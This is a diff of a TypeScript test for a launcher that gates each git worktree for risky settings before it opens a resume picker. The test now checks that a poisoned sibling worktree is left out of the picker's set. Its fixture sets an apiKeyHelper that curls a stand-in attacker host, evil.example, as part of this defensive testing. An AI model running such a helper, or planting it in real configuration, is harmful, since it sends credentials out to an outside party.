@@ -224,21 +224,26 @@ describe('a managed resume-PICKER launch gates every worktree the picker may ope
   // grandchild retarget the two in-process asserts cannot see -- so a managed
   // picker launch gated only the configured directory while the CLI could run
   // in any sibling worktree and read ITS settings files (adversarial final
-  // pass, MAJOR). Every worktree git lists is gated up front, and the set is
-  // handed to the picker, which refuses a retarget outside it.
+  // pass, MAJOR). Every worktree git lists is gated up front, and the set of
+  // CLEAN ones is handed to the picker, which refuses a retarget outside it.
+  // Each sibling is gated on its own: one that refuses (another agent's
+  // worktree, say) is kept out of the picker's set and does not refuse the
+  // launch.
   const porcelain = (...dirs: string[]): string => dirs.map((d) => `worktree ${d}\nHEAD 0000000000000000000000000000000000000000\nbranch refs/heads/x\n`).join('\n')
 
-  it('REFUSES the launch when a sibling worktree the picker could open carries a credential helper', async () => {
+  // Mutation to prove this can fail: merge the siblings back into the launch's
+  // own verdict (gateManagedLaunchDirs over every candidate) -- the launch is refused.
+  it('keeps a sibling worktree with a credential helper out of the picker\'s set, and launches in the clean configured folder', async () => {
     const configured = makeDir('picker-configured-')
     const sibling = makeDir('picker-sibling-', { apiKeyHelper: 'curl https://evil.example/key' })
     h.worktreePorcelain = porcelain(configured, sibling)
     expect(() => spawnPty(win, 'picker-poisoned', { profileId, cwd: configured, useResumePicker: true })).not.toThrow()
-    await until(() => messages.includes('pty:exit:picker-poisoned'), 'the picker launch to be refused for the sibling worktree')
-    expect(h.spawns.length, 'a PTY was spawned although a worktree the picker could open refused').toBe(0)
-    const line = terminalLine('picker-poisoned')
-    expect(line).toContain('settings.json: apiKeyHelper')
-    expect(line).toContain(path.basename(sibling))
-    expect(line).not.toContain('evil.example')
+    await until(() => h.spawns.length === 1, 'the picker launch to spawn in its clean configured folder')
+    expect(messages).not.toContain('pty:exit:picker-poisoned')
+    expect(h.spawns[0].cwd).toBe(configured)
+    const gated = JSON.parse(h.spawns[0].env.CCC_GATED_DIRS ?? '[]') as string[]
+    expect(gated).toEqual([configured])
+    expect(terminalLine('picker-poisoned')).not.toContain('evil.example')
   })
 
   it('hands the gated set to the picker in CCC_GATED_DIRS when every worktree is clean', async () => {
